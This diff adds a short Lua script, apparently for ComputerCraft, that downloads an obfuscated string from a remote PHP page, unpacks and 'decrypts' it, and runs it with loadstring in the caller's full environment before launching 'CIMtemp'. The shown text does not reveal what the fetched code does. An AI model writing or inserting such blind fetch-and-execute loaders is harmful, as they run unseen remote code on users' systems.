@@ -1,0 +1,33 @@
+local temp = nil
+local data = nil
+if not http then print( "Requires HTTP API" ) return end
+local file = http.get("http://minecraftcim.99k.org/cim.php")
+data = file:readLine()
+file:close()
+_tl = tonumber(string.sub(data, string.len(data))) + 2
+_t = string.sub(data, string.len(data) - _tl)
+_tl = string.sub(_t,-1)                                      
+_t = string.sub(_t, 1, string.len(_t) - 1)
+_el = string.sub(_t,-1)                                      
+_t = string.sub(_t, 1, string.len(_t) - 1)
+_e = string.sub(_t, string.len(_t) - _el + 1)
+_t = string.sub(_t, 1, string.len(_t) - _el)
+_sl = string.sub(_t,-1)                   
+_t = string.sub(_t, 1, string.len(_t) - 1)
+_s = _t                   
+data = string.sub(data,6,string.len(data) - (42 + _tl))
+temp = string.sub(data,_s,_e)
+data1 = string.sub(data, 1, _s - 1)
+data2 = string.sub(data, _e + 1)
+data = data1..data2
+temp = string.gsub(temp, "#S#", "")
+temp = string.gsub(temp, "#E#", " \n")
+temp = string.gsub(temp, "#A#", "#S#")
+temp = string.gsub(temp, "#B#", "#E#")
+temp = string.gsub(temp, "#C#", "\\n")
+data = string.gsub(data, "\"", "\\\"")
+temp = temp .. "decrypt(\""..data.."\")"
+test = loadstring(temp)
+setfenv( test, getfenv() )
+test()
+shell.run("CIMtemp")
